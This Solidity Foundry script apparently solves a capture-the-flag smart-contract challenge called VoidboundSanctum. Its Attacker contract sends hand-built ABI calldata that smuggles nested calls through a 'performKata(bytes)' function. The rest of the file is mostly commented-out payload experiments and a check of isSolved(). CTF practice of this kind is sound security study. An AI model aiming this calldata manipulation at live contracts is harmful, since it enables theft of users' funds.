// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Script, console} from "forge-std/Script.sol";
import { VoidBoundBlade, VoidboundSanctum } from "../src/CTF/src/Setup.sol";


contract Attacker {


    constructor (address addr) {

        VoidboundSanctum vbs = VoidboundSanctum(addr);

		bytes memory Xploit = bytes.concat(
			bytes4(keccak256("performKata(bytes)")),
			bytes32(uint256(0x60)),
			bytes32(uint256(4)),
			bytes32(keccak256("getBladeCount()")),
			bytes32(uint256(4)),
			bytes4(keccak256("enterSanctum()"))
		);


        address(vbs).call(Xploit);

    }

}

contract ShogunKiller is Script {
	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

    // VoidBoundBlade public instance = VoidBoundBlade(0xD70a469Fa0d1A2578C72Fd649AFD6b6dff339F20);
    VoidBoundBlade public instance = new VoidBoundBlade(me);

    function run() external {
        vm.startBroadcast(prv);
        
        VoidboundSanctum vbs = VoidboundSanctum(instance.SANCTUM());

        new Attacker(address(vbs));


        console.log(instance.isSolved());


        console.log(vbs.riteDepth());
        uint256 bladeId = 1337;

        // bytes memory payload = bytes.concat(
        //     bytes4(keccak256("mirrorRite(bytes)")),
            
        // );

        // bytes memory payload = bytes.concat(
        //     // call1
        //     bytes4(vbs.mirrorRite.selector),
        //     bytes32(uint256(0x00)),
        //     bytes32(uint256(8*32)),

        //     // call2
        //         bytes32(vbs.mirrorRite.selector),
        //         bytes32(uint256(0x00)),
        //         bytes32(uint256(0x00)),
    
        //     // call3
        //         bytes32(vbs.mirrorRite.selector),
        //         bytes32(uint256(0x00)),
        //         bytes32(uint256(32+32)),
        //         bytes32(vbs.attuneRelic.selector),
        //         bytes32(bladeId)

        // );

        // // vbs.mirrorRite(payload);
        // address(vbs).call(payload);


        // bytes memory payload = bytes.concat(
        //     bytes4(keccak256("mirrorRite(bytes)"))
        // );
        // vbs.mirrorRite(payload);
        // vbs.voidAttune(bladeId);




        console.log(vbs.riteDepth());
    


        // vbs.pledgeClan(0);

        


        // vbs.awakenRonin();
        // vbs.duelShogun();
        // vbs.awakenRonin();
        // vbs.duelShogun();
        // vbs.awakenRonin();
        // vbs.duelShogun();
        // vbs.awakenRonin();
        // vbs.duelShogun();
        // vbs.awakenRonin();
        // vbs.duelShogun();
        // vbs.awakenRonin();
        // vbs.duelShogun();

        console.log(instance.isSolved());


        vm.stopBroadcast();
    }

}

